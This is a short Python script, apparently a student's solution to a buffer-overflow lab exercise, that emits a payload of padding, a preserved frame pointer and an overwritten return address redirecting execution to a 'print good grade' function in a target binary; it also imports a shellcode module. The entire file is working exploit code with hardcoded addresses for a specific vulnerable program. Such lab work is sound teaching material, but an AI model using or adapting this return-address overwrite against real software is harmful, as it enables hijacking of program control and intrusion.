#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"\x00"*4)
sys.stdout.buffer.write(pack("<I",0xfffeb534)) #keep ebp the same
sys.stdout.buffer.write(pack("<I",0x080488bc)) #change return address to address of print good grade function

#sys.stdout.buffer.write(pack("<I", 0xDEADBEEF))

